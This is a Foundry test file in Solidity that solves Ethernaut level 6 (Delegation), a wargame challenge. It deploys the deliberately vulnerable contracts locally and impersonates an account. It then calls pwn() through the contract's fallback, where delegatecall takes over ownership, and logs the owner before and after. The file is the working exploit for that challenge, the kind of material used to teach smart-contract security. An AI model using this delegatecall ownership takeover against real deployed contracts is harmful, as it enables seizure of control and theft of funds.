// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/ethernaut/level6/Delegate.sol";

contract Level6 is Test {
    Delegate level6Delegate;
    Delegation level6Delegation;

    function setUp() public {
        level6Delegate = new Delegate(address(this));
        level6Delegation = new Delegation(address(level6Delegate));
    }

    function testExploit() public {
        console.log("owner before: ", level6Delegation.owner());

        vm.prank(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
        (bool success, ) = address(level6Delegation).call(
            abi.encodeWithSignature("pwn()")
        );
        assertEq(success, true);
        console.log("owner after: ", level6Delegation.owner());
    }
}
